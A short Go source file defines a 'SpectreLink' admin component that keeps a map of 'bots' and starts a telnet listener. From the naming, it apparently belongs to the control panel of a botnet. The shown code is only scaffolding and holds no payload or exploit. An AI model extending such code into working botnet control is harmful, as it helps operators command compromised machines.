package admin

import (
	"SpectreLink/log"
	"sync"
)

type SpectreLink struct {
	bots   *sync.Map
	telnet *TelnetServer
}

func (l *SpectreLink) ListenAndServe() {
	wg := new(sync.WaitGroup)
	wg.Add(1)

	log.Infof("Listening on %s", l.telnet.server.Address)

	go l.telnet.listenAndServe(wg)

	wg.Wait()
}

func NewSpectreLink() *SpectreLink {
	return &SpectreLink{
		telnet: NewTelnetServer(),
		bots:   new(sync.Map),
	}
}
